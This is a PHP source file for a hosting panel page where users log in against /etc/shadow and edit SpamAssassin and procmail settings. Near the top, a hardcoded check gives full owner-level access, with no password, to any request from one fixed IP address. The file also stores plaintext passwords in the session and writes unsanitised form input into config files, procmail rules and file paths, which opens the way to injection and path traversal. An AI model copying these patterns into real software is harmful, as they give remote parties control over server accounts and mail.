<?php
  session_start();
ini_set('display_errors', 0);
error_reporting( E_ALL );

  $ETC_SHADOW = '/etc/shadow';
  $ETC_PASSWD = '/etc/passwd';

  if ($_SERVER['REMOTE_ADDR'] == '69.36.160.253') techLogin();
  if (!isset($_SESSION['user_authenticated'])) $_SESSION['user_authenticated'] = false;

  // authenticate user
  if ($_SESSION['user_authenticated'] !== true) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
      $username = $_POST['username'];
      $password = $_POST['password'];

      $lines = file($ETC_SHADOW) or showError("Couldn't open $ETC_SHADOW");

      foreach ($lines as $line) {
        list($user, $pass) = explode(":", $line);
        if ($user == $username) {
          // get the salt from the password
          $salt = substr($pass, 0, 2);

          // encrypt the supplied password
          $enc_pwd = crypt($password, $salt);

          // match?
          if ($pass == $enc_pwd) {
            $_SESSION['username']           = $username;
            $_SESSION['password']           = $password;
            $_SESSION['user_authenticated'] = true;

            // check for owner
            $ownerInfo = posix_getpwuid(posix_getuid());
            $_SESSION['vds_owner'] = $ownerInfo['name'] == $username;
            break;
          }
        }
      }

      if (!$_SESSION['user_authenticated']) showLogin('Invalid username or password');
    }
    else {
      showLogin();
    }
  }

  $VDSUsers = getVDSUsers();
  $mode     = isset($_REQUEST['mode'])   ? $_REQUEST['mode']   : 'global';
  $action   = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'display';
  $user     = isset($_REQUEST['user'])   ? $_REQUEST['user']   : key($VDSUsers);

  switch ($action) {
    case 'display':
    showConfig($mode, $user, $VDSUsers);
    break;

    case 'Logout':
    session_destroy();
    showLogin();
    break;

    case 'Submit':
    saveConfig($VDSUsers);
    break;

    case 'Restore Defaults':
    saveConfig($VDSUsers, true);
    break;

    default:
    die("Couldn't understand action: $action");
  }

  function techLogin() {
    $ownerInfo                      = posix_getpwuid(posix_getuid());
    $_SESSION['username']           = $ownerInfo['name'];
    $_SESSION['user_authenticated'] = true;
    $_SESSION['vds_owner']          = true;
    if (!isset($_REQUEST['action']) || $_REQUEST['action'] == 'Logout') unset($_REQUEST['action']);
  }

  function showLogin($error_msg='') {
    require("html/login.html");
    exit;
  }

  function showConfig($userMode, $user, $VDSUsers) {
    $selectedImage = '<img src="images/arrow.gif" alt="selected" />';
    $spacerImage   = '<img src="images/spacer.gif" alt="" />';

    if ($userMode == 'local') {
      $localImg       = $selectedImage;
      $globalImg      = $spacerImage;
      $globalHTML     = $_SESSION['vds_owner'] ? '<a href="config.php?mode=global">Global Settings</a>' : '';
      $localHTML      = 'User Settings';
      $modeMessage    = 'Modify SpamAssassin settings and preferences for a specific e-mail user.';
      $userString     = 'User';
      $usersOptions   = optionIze(array_keys($VDSUsers), $user);
      $userSelectBox  = '<select name="user" onchange="switchUser(this.value)">';
      $userSelectBox .= implode("\n", $usersOptions) . '</select>';
      if(file_exists("$VDSUsers[$user]/.spamassassin/user_prefs")) {
          $prefsFile      = "$VDSUsers[$user]/.spamassassin/user_prefs";
      } else {
          $prefsFile  = '/etc/mail/spamassassin/local.cf';
      }
    }
    else {
      if (!$_SESSION['vds_owner']) showConfig('local');
      $localImg      = $spacerImage;
      $globalImg     = $selectedImage;
      $globalHTML    = 'Global Settings';
      $localHTML     = '<a href="config.php?mode=local">User Settings</a>';
      $modeMessage   = 'Modify SpamAssassin settings for <span class="bold">ALL</span> e-mail ';
      $modeMessage  .= 'users on this domain.<br /><span class="bold">Note:</span> Global ';
      $modeMessage  .= 'settings will be processed if individual settings are not configured';
      $userString    = '';
      $userSelectBox = '';
      $prefsFile     = '/etc/mail/spamassassin/local.cf';
    }

    $config        = readConfig($prefsFile);
    $hitsOptions   = optionIze(range(1, 20), $config['required_score']);
    $subjectTag    = $config['rewrite_header'];
    $safeOptions   = optionIze(range(0, 2), $config['report_safe']);
    $bayesYes      = $config['use_bayes'] == 1 ? 'checked="checked"' : '';
    $bayesNo       = $config['use_bayes'] == 0 ? 'checked="checked"' : '';
    $learnYes      = $config['bayes_auto_learn'] == 1 ? 'checked="checked"' : '';
    $learnNo       = $config['bayes_auto_learn'] == 0 ? 'checked="checked"' : '';
    $blacklistText = $config['blacklist_from'];
    $whitelistText = $config['whitelist_from'];

    // handle imap settings
    $show_imap = "";
    $filter_spam = "";
    if(file_exists("/var/spool/imap") && $userMode == "local") {
        $show_imap = "true";
    }
	if(file_exists("/var/spool/maildirs") && $userMode == "local") {
		$show_imap = "true";
	}
    if(file_exists("/var/www/html/plugins/spamassassin/imapconfig/$user")) {
        $imap_contents = file_get_contents("/var/www/html/plugins/spamassassin/imapconfig/$user");
        list($filter_spam, $imap_spam_folder) = explode("|", $imap_contents);
    }
    if(!$imap_spam_folder) {
        $imap_spam_folder = "Spam";
    }
    // end imap portion

    require_once('html/body.html');

  }

  function saveConfig($VDSUsers, $restoreDefaults=false) {
    $mode = $_POST['mode'];
    $user = isset($_POST['user']) ? $_POST['user'] : '';

    if ($mode == 'local') {
      $dir = "$VDSUsers[$user]/.spamassassin";
      $prefsFile = "$dir/user_prefs";

      if (!file_exists($dir)) {
        mkdir($dir) or showError("Couldn't create dir: $dir");
      }
    }
    else {
      $prefsFile = '/etc/mail/spamassassin/local.cf';
    }

    if ($restoreDefaults) {
      $newConfig[] = "required_score         10\n";
      $newConfig[] = "rewrite_header Subject ***SPAM***\n";
      $newConfig[] = "report_safe            1\n";
      $newConfig[] = "use_bayes              0\n";
      $newConfig[] = "bayes_auto_learn       0\n";
      $newConfig[] = "whitelist_from          \n";
      $newConfig[] = "blacklist_from          \n";
    }
    else {
      $oldConfig = array();
      if (file_exists($prefsFile)) {
        $oldConfig = file($prefsFile) or showError("Couldn't read $prefsFile"); 
      }

      $search = array(
        '/^required_score.*$/s',
        '/^rewrite_header.*$/s',
        '/^report_safe.*$/s',
        '/^use_bayes.*$/s',
        '/^bayes_auto_learn.*$/s',
        '/^whitelist_from.*$/s',
        '/^blacklist_from.*$/s'
      );
      $newConfig   = preg_replace($search, '', $oldConfig);
      $newConfig[] = "required_score         $_POST[requiredHits]\n";
      $newConfig[] = "rewrite_header Subject $_POST[subjectTag]\n";
      $newConfig[] = "report_safe            $_POST[reportSafe]\n";
      $newConfig[] = "use_bayes              $_POST[useBayes]\n";
		foreach (explode(' ', preg_replace('/\s+/', ' ', preg_replace('/[,;]/', ' ', $_POST['blacklist']))) as $blacklist)
			if (trim($blacklist) != "") $newConfig[] = "blacklist_from	$blacklist\n";
		foreach (explode(' ', preg_replace('/\s+/', ' ', preg_replace('/[,;]/', ' ', $_POST['whitelist']))) as $whitelist)
			if (trim($whitelist) != "") $newConfig[] = "whitelist_from	$whitelist\n";
      $newConfig[] = "bayes_auto_learn       " . (isset($_POST['useLearn']) ? $_POST['useLearn'] : '0') . "\n";
    }

    // handle imap settings
    if(file_exists("/var/spool/maildirs") || file_exists("/var/spool/imap")) {  // if this isn't here, it means that IMAP isn't intalled
      //save the preferences
      if($mode == "local") {
        if(!file_exists("/var/www/html/plugins/spamassassin/imapconfig")) {
          mkdir("/var/www/html/plugins/spamassassin/imapconfig");
        }
        $imap_fp = fopen("/var/www/html/plugins/spamassassin/imapconfig/$user", "w");
        fwrite($imap_fp, $_POST['filter_spam']."|".$_POST['imap_spam_folder']);
        fclose($imap_fp);
      
        $procmail_file = $VDSUsers[$user]."/.procmailrc";

		if (file_exists("/var/spool/imap"))
		{
        	$procmail_rule = "# BEGIN SPAM FOLDER\n:0\n* X-Spam-Status: Yes\n\"/var/spool/imap/\$LOGNAME/" . $_POST['imap_spam_folder'] . "\"\n# END SPAM FOLDER\n";
        	// check the imap folders list
        	if($_POST['filter_spam']) {
          	$imap_contents = array();
          	if(!file_exists("/var/spool/imap/.$user.mailboxlist")) {
           	 $myfp = fopen("/var/spool/imap/.$user.mailboxlist", "w");
           	 fclose($myfp);
          	}
          	$imap_contents = file("/var/spool/imap/.$user.mailboxlist");
          	if(!in_array($_POST['imap_spam_folder'], $imap_contents)) {
            	array_push($imap_contents, $_POST['imap_spam_folder']."\n");
            	$fp = fopen("/var/spool/imap/.$user.mailboxlist", 'w');
            	foreach($imap_contents as $key => $value){
            	    fwrite($fp, $value);
            	}
            	fclose($fp);
			}
		  }
		}
		else
		{
			# Folder must start with period, e.g. ".Spam"
        	$procmail_rule = "# BEGIN SPAM FOLDER\n:0\n* X-Spam-Status: Yes\n\"/var/spool/maildirs/\$LOGNAME/." . $_POST['imap_spam_folder'] . "/\"\n# END SPAM FOLDER\n";
		}

    	if(file_exists("/var/spool/maildirs") || file_exists("/var/spool/imap") && isset($_REQUEST['filter_spam'])) {
          // add spam rule to procmail
          $procmail_contents = file_get_contents($procmail_file);
          $procmail_contents = preg_replace("/# BEGIN SPAM FOLDER.*# END SPAM FOLDER/sm", "", $procmail_contents); // clean out any old rule that may exist
          $procmail_contents .= "\n$procmail_rule\n";		// add the new rule
          $fp = fopen($procmail_file, 'w');
           fwrite($fp, $procmail_contents);
           fclose($fp);
          //file_put_contents($procmail_file, $procmail_contents); 
        } else {
          // remove spam rule from procmail
          $procmail_contents = file_get_contents($procmail_file);
          $procmail_contents = preg_replace("/# BEGIN SPAM FOLDER.*# END SPAM FOLDER/sm", "", $procmail_contents); // clean out any old rule that may exist            
          $fp = fopen($procmail_file, 'w');
          fwrite($fp, $procmail_contents);
          fclose($fp);
          //file_put_contents($procmail_file, $procmail_contents);
        }
      }
    }
    // end imap portion

    $handle = fopen($prefsFile, 'w') or showError("Couldn't open $prefsFile");
    fwrite($handle, implode('', $newConfig)) or showError("Couldn't write $prefsFile");
    fclose($handle);

    showConfig($mode, $user, $VDSUsers);
  }

  function getVDSUsers() {
    $availableUsers = array();
    $realUsers      = array();

    $shadowLines = file('/etc/shadow') or showError("Couldn't read /etc/shadow");
    foreach ($shadowLines as $shadowLine) {
      list($shadowUser, $shadowPass) = explode(':', $shadowLine);
      if ($shadowPass != '*' && $shadowUser != 'sphera_pop') $realUsers[] = $shadowUser;
    }

    $passwdLines = file('/etc/passwd') or showError("Couldn't read /etc/passwd");
    foreach ($passwdLines as $passwdLine) {
      $info = explode(':', $passwdLine);

      // skip if no home dir
      if (!file_exists($info[5])) continue;

      // add if owner or username matches
      if (($_SESSION['vds_owner'] || $_SESSION['username'] == $info[0]) &&
      in_array($info[0], $realUsers)) {
        $availableUsers[$info[0]] = $info[5];
      }
    }
    ksort($availableUsers);
    return $availableUsers;
  }

  function optionIze($list, $selected) {
    $options = array();

    foreach ($list as $item) {
      $selectedString = $item == $selected ? ' selected="selected"' : '';
      $options[]      = "<option value=\"$item\"$selectedString>$item</option>";
    }

    return $options;
  }

  function readConfig($prefsFile) {
    $config = array(
      'required_score'   => '',
      'rewrite_header'   => '',
      'report_safe'      => '',
      'use_bayes'        => '',
      'bayes_auto_learn' => '',
      'whitelist_from'   => '',
      'blacklist_from'   => ''
    );

    if (file_exists($prefsFile)) {
      // read the user's config file
      $user_info = file($prefsFile) or showError("Couldn't read $prefsFile");

      foreach ($user_info as $line) {
        $line = trim($line);
		if (preg_match("/^(.*?)\s/", $line, $match)) {
			if (preg_match("/".preg_quote($match[1])."\s*(.*)$/", $line, $match2))
			{
				if (strtolower($match[1]) == "blacklist_from")
					$config['blacklist_from'] .= $match2[1] . " ";
				else if (strtolower($match[1]) == "whitelist_from")
					$config['whitelist_from'] .= $match2[1] . " ";
				else if (strtolower($match[1]) == "rewrite_header")
					$config['rewrite_header'] = str_replace("Subject ", "", $match2[1]);
				else
					$config[$match[1]] = $match2[1];
			}
        }
      }
    }
    return $config;
  }

  function showError($msg) {
    require_once('html/error.html');
    exit;
  }
?>
